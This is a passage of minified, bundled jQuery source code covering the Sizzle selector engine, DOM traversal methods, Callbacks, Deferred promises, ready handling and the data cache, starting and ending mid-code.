                if (e === t) return c = !0, 0;
                var n,
                  r = 0,
                  i = e.parentNode,
                  o = t.parentNode,
                  a = [e],
                  u = [t];
                if (!i || !o) return e == h ? -1 : t == h ? 1 : i ? -1 : o ? 1 : l ? P(l, e) - P(l, t) : 0;
                if (i === o) return fe(e, t);
                for (n = e; n = n.parentNode;) a.unshift(n);
                for (n = t; n = n.parentNode;) u.unshift(n);
                for (; a[r] === u[r];) r++;
                return r ? fe(a[r], u[r]) : a[r] == _ ? -1 : u[r] == _ ? 1 : 0;
              }, h) : h;
            }, ue.matches = function (e, t) {
              return ue(e, null, null, t);
            }, ue.matchesSelector = function (e, t) {
              if (f(e), n.matchesSelector && m && !D[t + " "] && (!v || !v.test(t)) && (!g || !g.test(t))) try {
                var r = y.call(e, t);
                if (r || n.disconnectedMatch || e.document && 11 !== e.document.nodeType) return r;
              } catch (e) {
                D(t, !0);
              }
              return ue(t, h, null, [e]).length > 0;
            }, ue.contains = function (e, t) {
              return (e.ownerDocument || e) != h && f(e), b(e, t);
            }, ue.attr = function (e, t) {
              (e.ownerDocument || e) != h && f(e);
              var i = r.attrHandle[t.toLowerCase()],
                o = i && $.call(r.attrHandle, t.toLowerCase()) ? i(e, t, !m) : void 0;
              return void 0 !== o ? o : n.attributes || !m ? e.getAttribute(t) : (o = e.getAttributeNode(t)) && o.specified ? o.value : null;
            }, ue.escape = function (e) {
              return (e + "").replace(re, ie);
            }, ue.error = function (e) {
              throw new Error("Syntax error, unrecognized expression: " + e);
            }, ue.uniqueSort = function (e) {
              var t,
                r = [],
                i = 0,
                o = 0;
              if (c = !n.detectDuplicates, l = !n.sortStable && e.slice(0), e.sort(A), c) {
                for (; t = e[o++];) t === e[o] && (i = r.push(o));
                for (; i--;) e.splice(r[i], 1);
              }
              return l = null, e;
            }, i = ue.getText = function (e) {
              var t,
                n = "",
                r = 0,
                o = e.nodeType;
              if (o) {
                if (1 === o || 9 === o || 11 === o) {
                  if ("string" == typeof e.textContent) return e.textContent;
                  for (e = e.firstChild; e; e = e.nextSibling) n += i(e);
                } else if (3 === o || 4 === o) return e.nodeValue;
              } else for (; t = e[r++];) n += i(t);
              return n;
            }, r = ue.selectors = {
              cacheLength: 50,
              createPseudo: de,
              match: Q,
              attrHandle: {},
              find: {},
              relative: {
                ">": {
                  dir: "parentNode",
                  first: !0
                },
                " ": {
                  dir: "parentNode"
                },
                "+": {
                  dir: "previousSibling",
                  first: !0
                },
                "~": {
                  dir: "previousSibling"
                }
              },
              preFilter: {
                ATTR: function (e) {
                  return e[1] = e[1].replace(te, ne), e[3] = (e[3] || e[4] || e[5] || "").replace(te, ne), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4);
                },
                CHILD: function (e) {
                  return e[1] = e[1].toLowerCase(), "nth" === e[1].slice(0, 3) ? (e[3] || ue.error(e[0]), e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])), e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && ue.error(e[0]), e;
                },
                PSEUDO: function (e) {
                  var t,
                    n = !e[6] && e[2];
                  return Q.CHILD.test(e[0]) ? null : (e[3] ? e[2] = e[4] || e[5] || "" : n && Y.test(n) && (t = a(n, !0)) && (t = n.indexOf(")", n.length - t) - n.length) && (e[0] = e[0].slice(0, t), e[2] = n.slice(0, t)), e.slice(0, 3));
                }
              },
              filter: {
                TAG: function (e) {
                  var t = e.replace(te, ne).toLowerCase();
                  return "*" === e ? function () {
                    return !0;
                  } : function (e) {
                    return e.nodeName && e.nodeName.toLowerCase() === t;
                  };
                },
                CLASS: function (e) {
                  var t = T[e + " "];
                  return t || (t = new RegExp("(^|" + I + ")" + e + "(" + I + "|$)")) && T(e, function (e) {
                    return t.test("string" == typeof e.className && e.className || void 0 !== e.getAttribute && e.getAttribute("class") || "");
                  });
                },
                ATTR: function (e, t, n) {
                  return function (r) {
                    var i = ue.attr(r, e);
                    return null == i ? "!=" === t : !t || (i += "", "=" === t ? i === n : "!=" === t ? i !== n : "^=" === t ? n && 0 === i.indexOf(n) : "*=" === t ? n && i.indexOf(n) > -1 : "$=" === t ? n && i.slice(-n.length) === n : "~=" === t ? (" " + i.replace(U, " ") + " ").indexOf(n) > -1 : "|=" === t && (i === n || i.slice(0, n.length + 1) === n + "-"));
                  };
                },
                CHILD: function (e, t, n, r, i) {
                  var o = "nth" !== e.slice(0, 3),
                    a = "last" !== e.slice(-4),
                    u = "of-type" === t;
                  return 1 === r && 0 === i ? function (e) {
                    return !!e.parentNode;
                  } : function (t, n, s) {
                    var d,
                      l,
                      c,
                      f,
                      h,
                      p,
                      m = o !== a ? "nextSibling" : "previousSibling",
                      g = t.parentNode,
                      v = u && t.nodeName.toLowerCase(),
                      y = !s && !u,
                      b = !1;
                    if (g) {
                      if (o) {
                        for (; m;) {
                          for (f = t; f = f[m];) if (u ? f.nodeName.toLowerCase() === v : 1 === f.nodeType) return !1;
                          p = m = "only" === e && !p && "nextSibling";
                        }
                        return !0;
                      }
                      if (p = [a ? g.firstChild : g.lastChild], a && y) {
                        for (b = (h = (d = (l = (c = (f = g)[w] || (f[w] = {}))[f.uniqueID] || (c[f.uniqueID] = {}))[e] || [])[0] === E && d[1]) && d[2], f = h && g.childNodes[h]; f = ++h && f && f[m] || (b = h = 0) || p.pop();) if (1 === f.nodeType && ++b && f === t) {
                          l[e] = [E, h, b];
                          break;
                        }
                      } else if (y && (b = h = (d = (l = (c = (f = t)[w] || (f[w] = {}))[f.uniqueID] || (c[f.uniqueID] = {}))[e] || [])[0] === E && d[1]), !1 === b) for (; (f = ++h && f && f[m] || (b = h = 0) || p.pop()) && ((u ? f.nodeName.toLowerCase() !== v : 1 !== f.nodeType) || !++b || (y && ((l = (c = f[w] || (f[w] = {}))[f.uniqueID] || (c[f.uniqueID] = {}))[e] = [E, b]), f !== t)););
                      return (b -= i) === r || b % r == 0 && b / r >= 0;
                    }
                  };
                },
                PSEUDO: function (e, t) {
                  var n,
                    i = r.pseudos[e] || r.setFilters[e.toLowerCase()] || ue.error("unsupported pseudo: " + e);
                  return i[w] ? i(t) : i.length > 1 ? (n = [e, e, "", t], r.setFilters.hasOwnProperty(e.toLowerCase()) ? de(function (e, n) {
                    for (var r, o = i(e, t), a = o.length; a--;) e[r = P(e, o[a])] = !(n[r] = o[a]);
                  }) : function (e) {
                    return i(e, 0, n);
                  }) : i;
                }
              },
              pseudos: {
                not: de(function (e) {
                  var t = [],
                    n = [],
                    r = u(e.replace(q, "$1"));
                  return r[w] ? de(function (e, t, n, i) {
                    for (var o, a = r(e, null, i, []), u = e.length; u--;) (o = a[u]) && (e[u] = !(t[u] = o));
                  }) : function (e, i, o) {
                    return t[0] = e, r(t, null, o, n), t[0] = null, !n.pop();
                  };
                }),
                has: de(function (e) {
                  return function (t) {
                    return ue(e, t).length > 0;
                  };
                }),
                contains: de(function (e) {
                  return e = e.replace(te, ne), function (t) {
                    return (t.textContent || i(t)).indexOf(e) > -1;
                  };
                }),
                lang: de(function (e) {
                  return V.test(e || "") || ue.error("unsupported lang: " + e), e = e.replace(te, ne).toLowerCase(), function (t) {
                    var n;
                    do {
                      if (n = m ? t.lang : t.getAttribute("xml:lang") || t.getAttribute("lang")) return (n = n.toLowerCase()) === e || 0 === n.indexOf(e + "-");
                    } while ((t = t.parentNode) && 1 === t.nodeType);
                    return !1;
                  };
                }),
                target: function (t) {
                  var n = e.location && e.location.hash;
                  return n && n.slice(1) === t.id;
                },
                root: function (e) {
                  return e === p;
                },
                focus: function (e) {
                  return e === h.activeElement && (!h.hasFocus || h.hasFocus()) && !!(e.type || e.href || ~e.tabIndex);
                },
                enabled: me(!1),
                disabled: me(!0),
                checked: function (e) {
                  var t = e.nodeName.toLowerCase();
                  return "input" === t && !!e.checked || "option" === t && !!e.selected;
                },
                selected: function (e) {
                  return e.parentNode && e.parentNode.selectedIndex, !0 === e.selected;
                },
                empty: function (e) {
                  for (e = e.firstChild; e; e = e.nextSibling) if (e.nodeType < 6) return !1;
                  return !0;
                },
                parent: function (e) {
                  return !r.pseudos.empty(e);
                },
                header: function (e) {
                  return J.test(e.nodeName);
                },
                input: function (e) {
                  return K.test(e.nodeName);
                },
                button: function (e) {
                  var t = e.nodeName.toLowerCase();
                  return "input" === t && "button" === e.type || "button" === t;
                },
                text: function (e) {
                  var t;
                  return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase());
                },
                first: ge(function () {
                  return [0];
                }),
                last: ge(function (e, t) {
                  return [t - 1];
                }),
                eq: ge(function (e, t, n) {
                  return [n < 0 ? n + t : n];
                }),
                even: ge(function (e, t) {
                  for (var n = 0; n < t; n += 2) e.push(n);
                  return e;
                }),
                odd: ge(function (e, t) {
                  for (var n = 1; n < t; n += 2) e.push(n);
                  return e;
                }),
                lt: ge(function (e, t, n) {
                  for (var r = n < 0 ? n + t : n > t ? t : n; --r >= 0;) e.push(r);
                  return e;
                }),
                gt: ge(function (e, t, n) {
                  for (var r = n < 0 ? n + t : n; ++r < t;) e.push(r);
                  return e;
                })
              }
            }, r.pseudos.nth = r.pseudos.eq, {
              radio: !0,
              checkbox: !0,
              file: !0,
              password: !0,
              image: !0
            }) r.pseudos[t] = he(t);
            for (t in {
              submit: !0,
              reset: !0
            }) r.pseudos[t] = pe(t);
            function ye() {}
            function be(e) {
              for (var t = 0, n = e.length, r = ""; t < n; t++) r += e[t].value;
              return r;
            }
            function we(e, t, n) {
              var r = t.dir,
                i = t.next,
                o = i || r,
                a = n && "parentNode" === o,
                u = x++;
              return t.first ? function (t, n, i) {
                for (; t = t[r];) if (1 === t.nodeType || a) return e(t, n, i);
                return !1;
              } : function (t, n, s) {
                var d,
                  l,
                  c,
                  f = [E, u];
                if (s) {
                  for (; t = t[r];) if ((1 === t.nodeType || a) && e(t, n, s)) return !0;
                } else for (; t = t[r];) if (1 === t.nodeType || a) if (l = (c = t[w] || (t[w] = {}))[t.uniqueID] || (c[t.uniqueID] = {}), i && i === t.nodeName.toLowerCase()) t = t[r] || t;else {
                  if ((d = l[o]) && d[0] === E && d[1] === u) return f[2] = d[2];
                  if (l[o] = f, f[2] = e(t, n, s)) return !0;
                }
                return !1;
              };
            }
            function _e(e) {
              return e.length > 1 ? function (t, n, r) {
                for (var i = e.length; i--;) if (!e[i](t, n, r)) return !1;
                return !0;
              } : e[0];
            }
            function Ee(e, t, n, r, i) {
              for (var o, a = [], u = 0, s = e.length, d = null != t; u < s; u++) (o = e[u]) && (n && !n(o, r, i) || (a.push(o), d && t.push(u)));
              return a;
            }
            function xe(e, t, n, r, i, o) {
              return r && !r[w] && (r = xe(r)), i && !i[w] && (i = xe(i, o)), de(function (o, a, u, s) {
                var d,
                  l,
                  c,
                  f = [],
                  h = [],
                  p = a.length,
                  m = o || function (e, t, n) {
                    for (var r = 0, i = t.length; r < i; r++) ue(e, t[r], n);
                    return n;
                  }(t || "*", u.nodeType ? [u] : u, []),
                  g = !e || !o && t ? m : Ee(m, f, e, u, s),
                  v = n ? i || (o ? e : p || r) ? [] : a : g;
                if (n && n(g, v, u, s), r) for (d = Ee(v, h), r(d, [], u, s), l = d.length; l--;) (c = d[l]) && (v[h[l]] = !(g[h[l]] = c));
                if (o) {
                  if (i || e) {
                    if (i) {
                      for (d = [], l = v.length; l--;) (c = v[l]) && d.push(g[l] = c);
                      i(null, v = [], d, s);
                    }
                    for (l = v.length; l--;) (c = v[l]) && (d = i ? P(o, c) : f[l]) > -1 && (o[d] = !(a[d] = c));
                  }
                } else v = Ee(v === a ? v.splice(p, v.length) : v), i ? i(null, a, v, s) : j.apply(a, v);
              });
            }
            function Te(e) {
              for (var t, n, i, o = e.length, a = r.relative[e[0].type], u = a || r.relative[" "], s = a ? 1 : 0, l = we(function (e) {
                  return e === t;
                }, u, !0), c = we(function (e) {
                  return P(t, e) > -1;
                }, u, !0), f = [function (e, n, r) {
                  var i = !a && (r || n !== d) || ((t = n).nodeType ? l(e, n, r) : c(e, n, r));
                  return t = null, i;
                }]; s < o; s++) if (n = r.relative[e[s].type]) f = [we(_e(f), n)];else {
                if ((n = r.filter[e[s].type].apply(null, e[s].matches))[w]) {
                  for (i = ++s; i < o && !r.relative[e[i].type]; i++);
                  return xe(s > 1 && _e(f), s > 1 && be(e.slice(0, s - 1).concat({
                    value: " " === e[s - 2].type ? "*" : ""
                  })).replace(q, "$1"), n, s < i && Te(e.slice(s, i)), i < o && Te(e = e.slice(i)), i < o && be(e));
                }
                f.push(n);
              }
              return _e(f);
            }
            return ye.prototype = r.filters = r.pseudos, r.setFilters = new ye(), a = ue.tokenize = function (e, t) {
              var n,
                i,
                o,
                a,
                u,
                s,
                d,
                l = C[e + " "];
              if (l) return t ? 0 : l.slice(0);
              for (u = e, s = [], d = r.preFilter; u;) {
                for (a in n && !(i = H.exec(u)) || (i && (u = u.slice(i[0].length) || u), s.push(o = [])), n = !1, (i = W.exec(u)) && (n = i.shift(), o.push({
                  value: n,
                  type: i[0].replace(q, " ")
                }), u = u.slice(n.length)), r.filter) !(i = Q[a].exec(u)) || d[a] && !(i = d[a](i)) || (n = i.shift(), o.push({
                  value: n,
                  type: a,
                  matches: i
                }), u = u.slice(n.length));
                if (!n) break;
              }
              return t ? u.length : u ? ue.error(e) : C(e, s).slice(0);
            }, u = ue.compile = function (e, t) {
              var n,
                i = [],
                o = [],
                u = S[e + " "];
              if (!u) {
                for (t || (t = a(e)), n = t.length; n--;) (u = Te(t[n]))[w] ? i.push(u) : o.push(u);
                u = S(e, function (e, t) {
                  var n = t.length > 0,
                    i = e.length > 0,
                    o = function (o, a, u, s, l) {
                      var c,
                        p,
                        g,
                        v = 0,
                        y = "0",
                        b = o && [],
                        w = [],
                        _ = d,
                        x = o || i && r.find.TAG("*", l),
                        T = E += null == _ ? 1 : Math.random() || .1,
                        C = x.length;
                      for (l && (d = a == h || a || l); y !== C && null != (c = x[y]); y++) {
                        if (i && c) {
                          for (p = 0, a || c.ownerDocument == h || (f(c), u = !m); g = e[p++];) if (g(c, a || h, u)) {
                            s.push(c);
                            break;
                          }
                          l && (E = T);
                        }
                        n && ((c = !g && c) && v--, o && b.push(c));
                      }
                      if (v += y, n && y !== v) {
                        for (p = 0; g = t[p++];) g(b, w, a, u);
                        if (o) {
                          if (v > 0) for (; y--;) b[y] || w[y] || (w[y] = N.call(s));
                          w = Ee(w);
                        }
                        j.apply(s, w), l && !o && w.length > 0 && v + t.length > 1 && ue.uniqueSort(s);
                      }
                      return l && (E = T, d = _), b;
                    };
                  return n ? de(o) : o;
                }(o, i)), u.selector = e;
              }
              return u;
            }, s = ue.select = function (e, t, n, i) {
              var o,
                s,
                d,
                l,
                c,
                f = "function" == typeof e && e,
                h = !i && a(e = f.selector || e);
              if (n = n || [], 1 === h.length) {
                if ((s = h[0] = h[0].slice(0)).length > 2 && "ID" === (d = s[0]).type && 9 === t.nodeType && m && r.relative[s[1].type]) {
                  if (!(t = (r.find.ID(d.matches[0].replace(te, ne), t) || [])[0])) return n;
                  f && (t = t.parentNode), e = e.slice(s.shift().value.length);
                }
                for (o = Q.needsContext.test(e) ? 0 : s.length; o-- && (d = s[o], !r.relative[l = d.type]);) if ((c = r.find[l]) && (i = c(d.matches[0].replace(te, ne), ee.test(s[0].type) && ve(t.parentNode) || t))) {
                  if (s.splice(o, 1), !(e = i.length && be(s))) return j.apply(n, i), n;
                  break;
                }
              }
              return (f || u(e, h))(i, t, !m, n, !t || ee.test(e) && ve(t.parentNode) || t), n;
            }, n.sortStable = w.split("").sort(A).join("") === w, n.detectDuplicates = !!c, f(), n.sortDetached = le(function (e) {
              return 1 & e.compareDocumentPosition(h.createElement("fieldset"));
            }), le(function (e) {
              return e.innerHTML = "<a href='#'></a>", "#" === e.firstChild.getAttribute("href");
            }) || ce("type|href|height|width", function (e, t, n) {
              if (!n) return e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2);
            }), n.attributes && le(function (e) {
              return e.innerHTML = "<input/>", e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value");
            }) || ce("value", function (e, t, n) {
              if (!n && "input" === e.nodeName.toLowerCase()) return e.defaultValue;
            }), le(function (e) {
              return null == e.getAttribute("disabled");
            }) || ce(L, function (e, t, n) {
              var r;
              if (!n) return !0 === e[t] ? t.toLowerCase() : (r = e.getAttributeNode(t)) && r.specified ? r.value : null;
            }), ue;
          }(r);
          T.find = S, T.expr = S.selectors, T.expr[":"] = T.expr.pseudos, T.uniqueSort = T.unique = S.uniqueSort, T.text = S.getText, T.isXMLDoc = S.isXML, T.contains = S.contains, T.escapeSelector = S.escape;
          var D = function (e, t, n) {
              for (var r = [], i = void 0 !== n; (e = e[t]) && 9 !== e.nodeType;) if (1 === e.nodeType) {
                if (i && T(e).is(n)) break;
                r.push(e);
              }
              return r;
            },
            A = function (e, t) {
              for (var n = []; e; e = e.nextSibling) 1 === e.nodeType && e !== t && n.push(e);
              return n;
            },
            $ = T.expr.match.needsContext;
          function k(e, t) {
            return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase();
          }
          var N = /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;
          function O(e, t, n) {
            return v(t) ? T.grep(e, function (e, r) {
              return !!t.call(e, r, e) !== n;
            }) : t.nodeType ? T.grep(e, function (e) {
              return e === t !== n;
            }) : "string" != typeof t ? T.grep(e, function (e) {
              return l.call(t, e) > -1 !== n;
            }) : T.filter(t, e, n);
          }
          T.filter = function (e, t, n) {
            var r = t[0];
            return n && (e = ":not(" + e + ")"), 1 === t.length && 1 === r.nodeType ? T.find.matchesSelector(r, e) ? [r] : [] : T.find.matches(e, T.grep(t, function (e) {
              return 1 === e.nodeType;
            }));
          }, T.fn.extend({
            find: function (e) {
              var t,
                n,
                r = this.length,
                i = this;
              if ("string" != typeof e) return this.pushStack(T(e).filter(function () {
                for (t = 0; t < r; t++) if (T.contains(i[t], this)) return !0;
              }));
              for (n = this.pushStack([]), t = 0; t < r; t++) T.find(e, i[t], n);
              return r > 1 ? T.uniqueSort(n) : n;
            },
            filter: function (e) {
              return this.pushStack(O(this, e || [], !1));
            },
            not: function (e) {
              return this.pushStack(O(this, e || [], !0));
            },
            is: function (e) {
              return !!O(this, "string" == typeof e && $.test(e) ? T(e) : e || [], !1).length;
            }
          });
          var j,
            R = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;
          (T.fn.init = function (e, t, n) {
            var r, i;
            if (!e) return this;
            if (n = n || j, "string" == typeof e) {
              if (!(r = "<" === e[0] && ">" === e[e.length - 1] && e.length >= 3 ? [null, e, null] : R.exec(e)) || !r[1] && t) return !t || t.jquery ? (t || n).find(e) : this.constructor(t).find(e);
              if (r[1]) {
                if (t = t instanceof T ? t[0] : t, T.merge(this, T.parseHTML(r[1], t && t.nodeType ? t.ownerDocument || t : b, !0)), N.test(r[1]) && T.isPlainObject(t)) for (r in t) v(this[r]) ? this[r](t[r]) : this.attr(r, t[r]);
                return this;
              }
              return (i = b.getElementById(r[2])) && (this[0] = i, this.length = 1), this;
            }
            return e.nodeType ? (this[0] = e, this.length = 1, this) : v(e) ? void 0 !== n.ready ? n.ready(e) : e(T) : T.makeArray(e, this);
          }).prototype = T.fn, j = T(b);
          var P = /^(?:parents|prev(?:Until|All))/,
            L = {
              children: !0,
              contents: !0,
              next: !0,
              prev: !0
            };
          function I(e, t) {
            for (; (e = e[t]) && 1 !== e.nodeType;);
            return e;
          }
          T.fn.extend({
            has: function (e) {
              var t = T(e, this),
                n = t.length;
              return this.filter(function () {
                for (var e = 0; e < n; e++) if (T.contains(this, t[e])) return !0;
              });
            },
            closest: function (e, t) {
              var n,
                r = 0,
                i = this.length,
                o = [],
                a = "string" != typeof e && T(e);
              if (!$.test(e)) for (; r < i; r++) for (n = this[r]; n && n !== t; n = n.parentNode) if (n.nodeType < 11 && (a ? a.index(n) > -1 : 1 === n.nodeType && T.find.matchesSelector(n, e))) {
                o.push(n);
                break;
              }
              return this.pushStack(o.length > 1 ? T.uniqueSort(o) : o);
            },
            index: function (e) {
              return e ? "string" == typeof e ? l.call(T(e), this[0]) : l.call(this, e.jquery ? e[0] : e) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1;
            },
            add: function (e, t) {
              return this.pushStack(T.uniqueSort(T.merge(this.get(), T(e, t))));
            },
            addBack: function (e) {
              return this.add(null == e ? this.prevObject : this.prevObject.filter(e));
            }
          }), T.each({
            parent: function (e) {
              var t = e.parentNode;
              return t && 11 !== t.nodeType ? t : null;
            },
            parents: function (e) {
              return D(e, "parentNode");
            },
            parentsUntil: function (e, t, n) {
              return D(e, "parentNode", n);
            },
            next: function (e) {
              return I(e, "nextSibling");
            },
            prev: function (e) {
              return I(e, "previousSibling");
            },
            nextAll: function (e) {
              return D(e, "nextSibling");
            },
            prevAll: function (e) {
              return D(e, "previousSibling");
            },
            nextUntil: function (e, t, n) {
              return D(e, "nextSibling", n);
            },
            prevUntil: function (e, t, n) {
              return D(e, "previousSibling", n);
            },
            siblings: function (e) {
              return A((e.parentNode || {}).firstChild, e);
            },
            children: function (e) {
              return A(e.firstChild);
            },
            contents: function (e) {
              return null != e.contentDocument && a(e.contentDocument) ? e.contentDocument : (k(e, "template") && (e = e.content || e), T.merge([], e.childNodes));
            }
          }, function (e, t) {
            T.fn[e] = function (n, r) {
              var i = T.map(this, t, n);
              return "Until" !== e.slice(-5) && (r = n), r && "string" == typeof r && (i = T.filter(r, i)), this.length > 1 && (L[e] || T.uniqueSort(i), P.test(e) && i.reverse()), this.pushStack(i);
            };
          });
          var F = /[^\x20\t\r\n\f]+/g;
          function B(e) {
            return e;
          }
          function M(e) {
            throw e;
          }
          function U(e, t, n, r) {
            var i;
            try {
              e && v(i = e.promise) ? i.call(e).done(t).fail(n) : e && v(i = e.then) ? i.call(e, t, n) : t.apply(void 0, [e].slice(r));
            } catch (e) {
              n.apply(void 0, [e]);
            }
          }
          T.Callbacks = function (e) {
            e = "string" == typeof e ? function (e) {
              var t = {};
              return T.each(e.match(F) || [], function (e, n) {
                t[n] = !0;
              }), t;
            }(e) : T.extend({}, e);
            var t,
              n,
              r,
              i,
              o = [],
              a = [],
              u = -1,
              s = function () {
                for (i = i || e.once, r = t = !0; a.length; u = -1) for (n = a.shift(); ++u < o.length;) !1 === o[u].apply(n[0], n[1]) && e.stopOnFalse && (u = o.length, n = !1);
                e.memory || (n = !1), t = !1, i && (o = n ? [] : "");
              },
              d = {
                add: function () {
                  return o && (n && !t && (u = o.length - 1, a.push(n)), function t(n) {
                    T.each(n, function (n, r) {
                      v(r) ? e.unique && d.has(r) || o.push(r) : r && r.length && "string" !== E(r) && t(r);
                    });
                  }(arguments), n && !t && s()), this;
                },
                remove: function () {
                  return T.each(arguments, function (e, t) {
                    for (var n; (n = T.inArray(t, o, n)) > -1;) o.splice(n, 1), n <= u && u--;
                  }), this;
                },
                has: function (e) {
                  return e ? T.inArray(e, o) > -1 : o.length > 0;
                },
                empty: function () {
                  return o && (o = []), this;
                },
                disable: function () {
                  return i = a = [], o = n = "", this;
                },
                disabled: function () {
                  return !o;
                },
                lock: function () {
                  return i = a = [], n || t || (o = n = ""), this;
                },
                locked: function () {
                  return !!i;
                },
                fireWith: function (e, n) {
                  return i || (n = [e, (n = n || []).slice ? n.slice() : n], a.push(n), t || s()), this;
                },
                fire: function () {
                  return d.fireWith(this, arguments), this;
                },
                fired: function () {
                  return !!r;
                }
              };
            return d;
          }, T.extend({
            Deferred: function (e) {
              var t = [["notify", "progress", T.Callbacks("memory"), T.Callbacks("memory"), 2], ["resolve", "done", T.Callbacks("once memory"), T.Callbacks("once memory"), 0, "resolved"], ["reject", "fail", T.Callbacks("once memory"), T.Callbacks("once memory"), 1, "rejected"]],
                n = "pending",
                i = {
                  state: function () {
                    return n;
                  },
                  always: function () {
                    return o.done(arguments).fail(arguments), this;
                  },
                  catch: function (e) {
                    return i.then(null, e);
                  },
                  pipe: function () {
                    var e = arguments;
                    return T.Deferred(function (n) {
                      T.each(t, function (t, r) {
                        var i = v(e[r[4]]) && e[r[4]];
                        o[r[1]](function () {
                          var e = i && i.apply(this, arguments);
                          e && v(e.promise) ? e.promise().progress(n.notify).done(n.resolve).fail(n.reject) : n[r[0] + "With"](this, i ? [e] : arguments);
                        });
                      }), e = null;
                    }).promise();
                  },
                  then: function (e, n, i) {
                    var o = 0;
                    function a(e, t, n, i) {
                      return function () {
                        var u = this,
                          s = arguments,
                          d = function () {
                            var r, d;
                            if (!(e < o)) {
                              if ((r = n.apply(u, s)) === t.promise()) throw new TypeError("Thenable self-resolution");
                              d = r && ("object" == typeof r || "function" == typeof r) && r.then, v(d) ? i ? d.call(r, a(o, t, B, i), a(o, t, M, i)) : (o++, d.call(r, a(o, t, B, i), a(o, t, M, i), a(o, t, B, t.notifyWith))) : (n !== B && (u = void 0, s = [r]), (i || t.resolveWith)(u, s));
                            }
                          },
                          l = i ? d : function () {
                            try {
                              d();
                            } catch (r) {
                              T.Deferred.exceptionHook && T.Deferred.exceptionHook(r, l.stackTrace), e + 1 >= o && (n !== M && (u = void 0, s = [r]), t.rejectWith(u, s));
                            }
                          };
                        e ? l() : (T.Deferred.getStackHook && (l.stackTrace = T.Deferred.getStackHook()), r.setTimeout(l));
                      };
                    }
                    return T.Deferred(function (r) {
                      t[0][3].add(a(0, r, v(i) ? i : B, r.notifyWith)), t[1][3].add(a(0, r, v(e) ? e : B)), t[2][3].add(a(0, r, v(n) ? n : M));
                    }).promise();
                  },
                  promise: function (e) {
                    return null != e ? T.extend(e, i) : i;
                  }
                },
                o = {};
              return T.each(t, function (e, r) {
                var a = r[2],
                  u = r[5];
                i[r[1]] = a.add, u && a.add(function () {
                  n = u;
                }, t[3 - e][2].disable, t[3 - e][3].disable, t[0][2].lock, t[0][3].lock), a.add(r[3].fire), o[r[0]] = function () {
                  return o[r[0] + "With"](this === o ? void 0 : this, arguments), this;
                }, o[r[0] + "With"] = a.fireWith;
              }), i.promise(o), e && e.call(o, o), o;
            },
            when: function (e) {
              var t = arguments.length,
                n = t,
                r = Array(n),
                i = u.call(arguments),
                o = T.Deferred(),
                a = function (e) {
                  return function (n) {
                    r[e] = this, i[e] = arguments.length > 1 ? u.call(arguments) : n, --t || o.resolveWith(r, i);
                  };
                };
              if (t <= 1 && (U(e, o.done(a(n)).resolve, o.reject, !t), "pending" === o.state() || v(i[n] && i[n].then))) return o.then();
              for (; n--;) U(i[n], a(n), o.reject);
              return o.promise();
            }
          });
          var q = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;
          T.Deferred.exceptionHook = function (e, t) {
            r.console && r.console.warn && e && q.test(e.name) && r.console.warn("jQuery.Deferred exception: " + e.message, e.stack, t);
          }, T.readyException = function (e) {
            r.setTimeout(function () {
              throw e;
            });
          };
          var H = T.Deferred();
          function W() {
            b.removeEventListener("DOMContentLoaded", W), r.removeEventListener("load", W), T.ready();
          }
          T.fn.ready = function (e) {
            return H.then(e).catch(function (e) {
              T.readyException(e);
            }), this;
          }, T.extend({
            isReady: !1,
            readyWait: 1,
            ready: function (e) {
              (!0 === e ? --T.readyWait : T.isReady) || (T.isReady = !0, !0 !== e && --T.readyWait > 0 || H.resolveWith(b, [T]));
            }
          }), T.ready.then = H.then, "complete" === b.readyState || "loading" !== b.readyState && !b.documentElement.doScroll ? r.setTimeout(T.ready) : (b.addEventListener("DOMContentLoaded", W), r.addEventListener("load", W));
          var z = function (e, t, n, r, i, o, a) {
              var u = 0,
                s = e.length,
                d = null == n;
              if ("object" === E(n)) for (u in i = !0, n) z(e, t, u, n[u], !0, o, a);else if (void 0 !== r && (i = !0, v(r) || (a = !0), d && (a ? (t.call(e, r), t = null) : (d = t, t = function (e, t, n) {
                return d.call(T(e), n);
              })), t)) for (; u < s; u++) t(e[u], n, a ? r : r.call(e[u], u, t(e[u], n)));
              return i ? e : d ? t.call(e) : s ? t(e[0], n) : o;
            },
            Y = /^-ms-/,
            V = /-([a-z])/g;
          function Q(e, t) {
            return t.toUpperCase();
          }
          function X(e) {
            return e.replace(Y, "ms-").replace(V, Q);
          }
          var K = function (e) {
            return 1 === e.nodeType || 9 === e.nodeType || !+e.nodeType;
          };
          function J() {
            this.expando = T.expando + J.uid++;
          }
          J.uid = 1, J.prototype = {
            cache: function (e) {
              var t = e[this.expando];
              return t || (t = {}, K(e) && (e.nodeType ? e[this.expando] = t : Object.defineProperty(e, this.expando, {
                value: t,
                configurable: !0
              }))), t;
            },
            set: function (e, t, n) {
              var r,
                i = this.cache(e);
              if ("string" == typeof t) i[X(t)] = n;else for (r in t) i[X(r)] = t[r];
              return i;
            },
            get: function (e, t) {
              return void 0 === t ? this.cache(e) : e[this.expando] && e[this.expando][X(t)];
            },
            access: function (e, t, n) {
              return void 0 === t || t && "string" == typeof t && void 0 === n ? this.get(e, t) : (this.set(e, t, n), void 0 !== n ? n : t);
            },
            remove: function (e, t) {
              var n,
                r = e[this.expando];
              if (void 0 !== r) {
                if (void 0 !== t) {
                  n = (t = Array.isArray(t) ? t.map(X) : (t = X(t)) in r ? [t] : t.match(F) || []).length;
                  for (; n--;) delete r[t[n]];
                }
                (void 0 === t || T.isEmptyObject(r)) && (e.nodeType ? e[this.expando] = void 0 : delete e[this.expando]);
              }
            },
            hasData: function (e) {
              var t = e[this.expando];
              return void 0 !== t && !T.isEmptyObject(t);
            }
          };
          var G = new J(),
            Z = new J(),
            ee = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
            te = /[A-Z]/g;
          function ne(e, t, n) {
            var r;
